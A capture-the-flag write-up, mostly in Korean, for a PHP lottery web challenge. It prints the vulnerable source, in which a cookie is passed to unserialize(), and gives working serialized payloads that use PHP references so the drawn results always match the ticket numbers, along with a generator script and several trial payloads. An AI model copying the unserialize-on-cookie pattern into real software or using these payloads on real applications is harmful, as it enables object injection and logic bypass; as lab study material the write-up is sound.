# Code
- result.php
```php
<?php
require('ticket.php');

$cookie_ticket = null;

if (isset($_COOKIE['ticket'])) {
    $cookie_ticket = $_COOKIE['ticket'];
    setcookie('ticket', '', time() - 1);
}

function validate($cookie_ticket) {
    if ($cookie_ticket == NULL) {
        echo "Get a ticket first!<br>";
        return;
    }

    if (!($d = base64_decode($cookie_ticket))) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!($ticket = unserialize($d))) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!($ticket instanceof Ticket)) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!is_array($ticket->numbers)) {
        echo "No cheating!<br>";
        return;
    }


    $results = draw(45, 6);

    for ($i = 0; $i < 6; $i++) {
        $ticket->results[$i] = $results[$i];
    }

    $win = true;

    for ($i = 0; $i < 6; $i++) {
        if ($ticket->results[$i] !== $ticket->numbers[$i]) {
            $win = false;
        }
    }

    echo "Lucky numbers: " . implode(', ', $ticket->results) . "<br>";
    echo "Your numbers: " . implode(', ', $ticket->numbers) . "<br>";

    if ($win) {
        echo "You win! get the flag: ";
        $fp = fopen("/flag.txt", "r");
        echo fgets($fp) . "<br>";
        fclose($fp);
    } else {
        echo "Too bad.. maybe next time<br>";
    } 
}

?>

<!DOCTYPE html>
<html>

<head>
    <link rel="stylesheet" type="text/css" href="style.css">
    <title>Lottery system</title>
</head>

<body>
    <h1>Lottery system</h1>
    <h2>Check result</h2>
    <?php validate($cookie_ticket); ?>
    <br>
    <a href="/index.php">Click here to return to main page</a>
</body>

</html>
```

- draw.php
```php
<?php
require('ticket.php');

$ticket_exist = false;

if (isset($_COOKIE['ticket'])) {
    $ticket_exist = true;
} else {
    $ticket = new Ticket();
    $ticket->issue();
    setcookie('ticket', base64_encode(serialize($ticket)));
}

?>

<!DOCTYPE html>
<html>

<head>
    <link rel="stylesheet" type="text/css" href="style.css">
    <title>Lottery system</title>
</head>

<body>
    <h1>Lottery system</h1>
    <h2>Draw ticket</h2>
    <?php
    if ($ticket_exist)
        echo "You already have a ticket!<br>";
    else
        echo "Issued a ticket!<br>Check your numbers: " . implode(', ', $ticket->numbers) . "<br>";
    ?>
    <br>
    <a href="/index.php">Click here to return to main page</a>
</body>

</html>
```

- ticket.php
```php
<?php

function draw($n, $k) {
    $ret = range(1, $n);
    for ($i = 0; $i < $n - 1; $i++) {
        $p = rand($i, $n - 1);
        [$ret[$i], $ret[$p]] = [$ret[$p], $ret[$i]];
    }
    $ret = array_slice($ret, 0, $k);
    sort($ret);
    return $ret;
}

class Ticket {
    public $results;
    public $numbers;

    function issue() {
        $this->numbers = draw(45, 6);
    }
}
?>
```


# Analysis
- 램덤한 번호 6개를 발급하고 다른 엔드포인트에서 새로 6개를 뽑고 같은지를 체크하고 같으면 flag를 주는 서비스

- 번호들을 발급할 때 `Ticket`이라는 객체를 통해 관리함
```php
class Ticket {
    public $results;
    public $numbers;

    function issue() {
        $this->numbers = draw(45, 6);
    }
}
```

- 발급한 `Ticket`을 그대로 주는게 아닌 직렬화 한 후 인코딩하여 쿠키로 설정함
```php
<?php
require('ticket.php');

$ticket_exist = false;

if (isset($_COOKIE['ticket'])) {
    $ticket_exist = true;
} else {
    $ticket = new Ticket();
    $ticket->issue();
    setcookie('ticket', base64_encode(serialize($ticket)));
}

?>
```

- 발금한 `Ticket`을 검증해야하기 때문에 아래와 같은 검증 로직이 있음
- 인코딩되어있는지, 직렬화가 되는지, `Ticket`의 인스턴스인지, 그리고 `Ticket`의 `number` 요소가 배열인지를 체크함 
```php
function validate($cookie_ticket) {
    if ($cookie_ticket == NULL) {
        echo "Get a ticket first!<br>";
        return;
    }

    if (!($d = base64_decode($cookie_ticket))) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!($ticket = unserialize($d))) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!($ticket instanceof Ticket)) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!is_array($ticket->numbers)) {
        echo "No cheating!<br>";
        return;
    }


    $results = draw(45, 6);

    for ($i = 0; $i < 6; $i++) {
        $ticket->results[$i] = $results[$i];
    }

    $win = true;

    for ($i = 0; $i < 6; $i++) {
        if ($ticket->results[$i] !== $ticket->numbers[$i]) {
            $win = false;
        }
    }

    echo "Lucky numbers: " . implode(', ', $ticket->results) . "<br>";
    echo "Your numbers: " . implode(', ', $ticket->numbers) . "<br>";

    if ($win) {
        echo "You win! get the flag: ";
        $fp = fopen("/flag.txt", "r");
        echo fgets($fp) . "<br>";
        fclose($fp);
    } else {
        echo "Too bad.. maybe next time<br>";
    } 
}
```


# Exploit
- 적절한 검증로직이 있어서 PHP 직렬화 취약점을 막은 것 같지만 우회할 수 있음
- PHP에서는 포인터라는 개념이 있고, 이를 이용해서 직렬화된 객체를 작성해 해결했음
```
O:6:"Ticket":2:{s:7:"results";N;s:7:"numbers";a:6:{i:0;R:4;i:1;R:5;i:2;R:6;i:3;R:7;i:4;R:8;i:5;R:9;}}
```

- 다른 풀이로는 sechack님의 직접 직렬화 객체를 만드는 php코드가 있음
- 훨씬 쉽고 직관적인 것 같음


```php
<?php
class Ticket {
    public $results;
    public $numbers;

    function issue() {
        $this->numbers = draw(45, 6);
    }
}

$ticket = new Ticket();
$ticket->results = array();
$ticket->numbers = &$ticket->results;
$data = serialize($ticket);
var_dump($data);
echo base64_encode($data);
?>
```

---
# Trial
```
O:6:"Ticket":2:{s:7:"results";N;s:7:"numbers";a:6:{i:0;i:7;i:1;i:8;i:2;i:27;i:3;i:28;i:4;i:33;i:5;i:40;}}

O:6:"Ticket":2:{s:7:"results";N;s:7:"numbers";R:2;}
O:6:"Ticket":2:{s:7:"results";N;s:7:"numbers";a:6:{i:0;i:7;i:1;i:8;i:2;i:27;i:3;i:28;i:4;i:33;i:5;i:40;}}

O:6:"Ticket":2:{s:7:"results";a:1:{i:0;O:4:"Data":1:{s:5:"value";i:42;}}s:7:"numbers";a:6:{i:0;R:4;i:1;R:4;i:2;R:4;i:3;R:4;i:4;R:4;i:5;R:4;}}


O:6:"Ticket":2:{
    s:7:"results";a:6:{
        i:0;i:7;
        i:1;i:8;
        i:2;i:27;
        i:3;i:28;
        i:4;i:33;
        i:5;i:40;
    }
    s:7:"numbers";a:6:{
        i:0;R:4;
        i:1;R:5;
        i:2;R:6;
        i:3;R:7;
        i:4;R:8;
        i:5;R:9;
    }
}


O:6:"Ticket":2:{
    s:7:"results";N;
    s:7:"numbers";a:6:{
        i:0;R:4;
        i:1;R:5;
        i:2;R:6;
        i:3;R:7;
        i:4;R:8;
        i:5;R:9;
    }
}

O:6:"Ticket":2:{s:7:"results";N;s:7:"numbers";a:6:{i:0;R:4;i:1;R:5;i:2;R:6;i:3;R:7;i:4;R:8;i:5;R:9;}}
```